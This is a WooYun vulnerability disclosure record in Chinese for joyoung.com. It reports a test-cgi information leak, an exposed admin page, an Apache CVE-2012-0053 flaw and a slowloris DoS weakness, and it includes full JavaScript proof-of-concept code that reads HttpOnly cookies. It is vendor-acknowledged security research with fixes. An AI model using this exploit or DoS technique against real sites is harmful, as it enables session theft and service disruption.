{"id": 54485, "wybug_id": "wooyun-2014-064227", "wybug_title": "九阳分站小礼包", "wybug_corp": "joyoung.com", "wybug_author": "爱南瓜", "wybug_date": "2014-06-10 18:32", "wybug_open_date": "2014-07-25 19:22", "wybug_type": "系统/服务运维配置不当", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-25：\t细节向公众公开  简要描述： 家里九阳豆浆机坏了。。顺手瞅瞅 详细说明：  虽然是小礼包还是有点干货的1>http://www.joyoung.com/cgi-bin/test-cgi/* 泄露了点配置信息2>http://www.joyoung.com/index.jsp   可以直访问后台，虽然做了cookie验证但是结合后面的漏洞还是很可能进入后台3>http://kf.joyoung.com/发现其Apache版本是2.2.17就想到了CVE-2012-0053然后验证了下确实存在此漏洞能读取http-only保护的cookies测试代码：\nfunction setCookies (good) {    var str = \"\";    for (var i=0; i< 819; i++) {        str += \"x\";    }    for (i = 0; i < 10; i++) {        if (good) {            var cookie = \"xss\"+i+\"=;expires=\"+new Date(+new Date()-1).toUTCString()+\"; path=/;\";        }        else {            var cookie = \"xss\"+i+\"=\"+str+\";path=/\";        }        document.cookie = cookie;    }} function makeRequest() {    setCookies();     function parseCookies () {        var cookie_dict = {};        if (xhr.readyState === 4 && xhr.status === 400) {            var content = xhr.responseText.replace(/\\r|\\n/g,'').match(/<pre>(.+)<\\/pre>/);            if (content.length) {                content = content[1].replace(\"Cookie: \", \"\");                var cookies = content.replace(/xss\\d=x+;?/g, '').split(/;/g);                for (var i=0; i<cookies.length; i++) {                    var s_c = cookies[i].split('=',2);                    cookie_dict[s_c[0]] = s_c[1];                }            }            setCookies(true);            alert(JSON.stringify(cookie_dict));        }    }    var xhr = new XMLHttpRequest();    xhr.onreadystatechange = parseCookies;    xhr.open(\"GET\", \"/\", true);    xhr.send(null);} makeRequest();\n虽然后台设置不对外或者有某些限制但这个加上2>应该能直接访问后台了，不会xss，没测试4>既然是apache2.x那slowloris http dos攻击存在不？强迫症0_o试了下发现确实存在slow_http_dos攻击，经测试等待超时时间为 11843 ms点到为止，没有进行ddos.至于测试代码是借鉴前人的http://ha.ckers.org/slowloris/slowloris.pl   漏洞证明：  \n\n\n\n\n\n\n\n   修复方案：  1.升级apache2.防御dos可以配置 Iptables,对于连接最多的IP进行block3.可以申请乌云众测等防范于未然   版权声明：转载请注明来源 爱南瓜@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-06-12 08:52 厂商回复： 感谢_爱南瓜_，发现我们的问题。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}